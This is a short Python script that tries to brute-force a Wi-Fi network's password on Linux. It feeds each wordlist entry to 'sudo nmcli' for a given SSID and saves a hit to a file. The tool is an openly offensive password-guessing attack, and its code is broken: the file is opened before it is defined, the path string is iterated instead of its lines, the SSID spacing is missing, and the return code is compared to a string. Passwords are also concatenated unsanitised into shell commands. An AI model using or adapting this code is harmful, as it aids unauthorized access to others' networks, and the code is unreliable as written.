import os,time,platform



os_inf = platform.system()

file = open (file,'r')
if os_inf == 'Linux':
    file = input ('enter file path >>> ')
    ssid = input('enter ssid >>> ')
    for password in file:
        command = 'sudo nmcli -p -w 1 dev wifi connect'+ssid+' password '+password
        b = os.system(command)
        print(b)

        if b != 'Error Timeout 1 sec expired.':
            print('password is in file '+password)
            os.system('echo '+password +'> password_wifi.txt')
            exit()
else:
    print('not linux')
    exit()